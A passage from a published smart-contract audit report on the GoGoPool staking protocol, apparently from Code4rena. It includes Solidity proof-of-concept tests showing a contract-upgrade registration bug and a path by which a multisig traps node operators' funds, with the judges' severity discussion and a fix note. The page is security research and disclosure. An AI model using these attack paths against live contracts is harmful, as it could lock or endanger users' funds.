class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">), </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk11\">fundGGPRewardsPool</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">fundGGPRewardsPool</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk3\">// guardian is minted 100% of the supply</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">guardian</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardsPoolAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">TOTAL_INITIAL_GGP_SUPPLY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk7\">.20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">), </span><span class=\"mtk12\">rewardsPoolAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">depositToken</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;RewardsPool&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rewardsPoolAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testUpgradeContractCorrectlyWithNameUnChanged</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk3\">//@audit increase GGPRewards before upgrading contract - no problem</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nopClaim</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseGGPRewards</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">), </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGGPRewards</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">)) == </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk3\">//@audit Start to upgrade contract ClaimNodeOp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">guardian</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk3\">//@audit upgraded contract by creating a new contract instance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">ClaimNodeOp</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nopClaimV2</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ClaimNodeOp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nopClaimV2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk3\">//@audit contract name is not changed!</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">name</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;ClaimNodeOp&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk3\">//@audit get existing contract info</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nopClaim</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">existingName</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;ClaimNodeOp&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk3\">//@audit new contract address is different from the old one</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk11\">assertFalse</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk3\">//@audit the existing contract should be already registered. Verify its info.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.exists&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">))), </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingName</span><span class=\"mtk1\">))), </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getString</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.name&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">))), </span><span class=\"mtk12\">existingName</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                        </span><span class=\"mtk3\">//@audit Upgrade contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">dao</span><span class=\"mtk1\">.</span><span class=\"mtk11\">upgradeExistingContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">name</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk3\">//@audit verify the upgraded contract has correct contract info registered</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.exists&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">))), </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">name</span><span class=\"mtk1\">))), </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getString</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.name&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">))), </span><span class=\"mtk12\">name</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk3\">//@audit verify that the old contract has been de-registered</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.exists&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">))), </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getString</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.name&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">))), </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk3\">//@audit The contract has new address now. Note that: existingName == name</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingName</span><span class=\"mtk1\">))), </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk3\">//@audit increase GGPRewards after upgrading contract ClaimNodeOp to ClaimNodeOpV2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nopClaimV2</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">//@audit using the new contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk3\">//@audit Successfully call the below function with hardcoded contract name &quot;ClaimNodeOp&quot; in the modifier</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseGGPRewards</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">), </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk3\">//@audit Successfully increased!</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGGPRewards</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">)) == </span><span class=\"mtk7\">20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/742#issuecomment-1379350503\">emersoncloud (GoGoPool) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/742#issuecomment-1384535064\">0xju1ie (GoGoPool) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Not sure if this is considered a high since there isn’t a direct loss of funds?</p>\n<p><code>Medium: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.</code></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/742#issuecomment-1409240633\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>In spite of the lack of risk for Principal, a core functionality of the protocol is impaired.</p>\n<p>This has to be countered versus the requirement of the names being the same, which intuitively seems to be the intended use case, as changing the name would also break balances / other integrations such as the modifier <code>onlySpecificRegisteredContract</code>.</p>\n<p>The other side of the argument is that the mistake is still fixable by the same actor within a reasonable time frame.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/742#issuecomment-1414350784\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>I believe the finding is meaningful and well written, but ultimately the damage can be undone with a follow-up call to <code>registerContract</code>.</p>\n<p>Because of this am downgrading to Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>Fix upgrade to work when a contract has the same name: <a href=\"https://github.com/multisig-labs/gogopool/pull/32\">multisig-labs/gogopool#32</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/11\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/27\">hansfriese</a>.</p>\n<hr>\n<h2 id=\"m-03-nodeop-funds-may-be-trapped-by-a-invalid-state-transition\" style=\"position:relative;\"><a href=\"#m-03-nodeop-funds-may-be-trapped-by-a-invalid-state-transition\" aria-label=\"m 03 nodeop funds may be trapped by a invalid state transition permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/723\">[M-03] NodeOp funds may be trapped by a invalid state transition</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/723\">0xbepresent</a>, also found by <a href=\"undefined\">cozzetti</a>, <a href=\"undefined\">wagmi</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/878\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/683\">sces60107</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/681\">peritoflores</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/581\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/562\">yixxas</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/495\">immeas</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/420\">Ch_301</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/311\">0Kage</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/270\">kaliberpoziomka8552</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/175\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/135\">Atarpara</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/85\">Manboy</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484</a><br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L528\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L528</a><br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L287\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L287</a></p>\n<p>The Multisig can call <code>MinipoolManager.sol::recordStakingError()</code> if there is an error while registering the node as a validator. Also the Multisig can call <a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L528\">MinipoolManager.sol::finishFailedMinipoolByMultisig()</a> in order to “finish” the NodeOp’s minipool proccess.</p>\n<p>If the Multisig accidentally/intentionally calls <code>recordStakingError()</code> then <code>finishFailedMinipoolByMultisig()</code> the NodeOp funds may be trapped in the protocol.</p>\n<p>The <code>finishFailedMinipoolByMultisig()</code> has the next comment: <em>Multisig can move a minipool from the error state to the finished state after a human review of the error</em> but the NodeOp should be able to withdraw his funds after a finished minipool.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>I created a test for this situation in <code>MinipoolManager.t.sol</code>. At the end you can observe that the <code>withdrawMinipoolFunds()</code> reverts with <code>InvalidStateTransition</code> error:</p>\n<ol>\n<li>NodeOp creates the minipool</li>\n<li>Rialto calls claimAndInitiateStaking</li>\n<li>Something goes wrong and Rialto calls recordStakingError()</li>\n<li>Rialto accidentally/intentionally calls finishFailedMinipoolByMultisig() in order to finish the NodeOp’s minipool</li>\n<li>The NodeOp can not withdraw his funds. The withdraw function reverts with InvalidStateTransition() error</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testUserFundsStuckErrorFinished</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// NodeOp funds may be trapped by a invalid state transition</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 1. NodeOp creates the 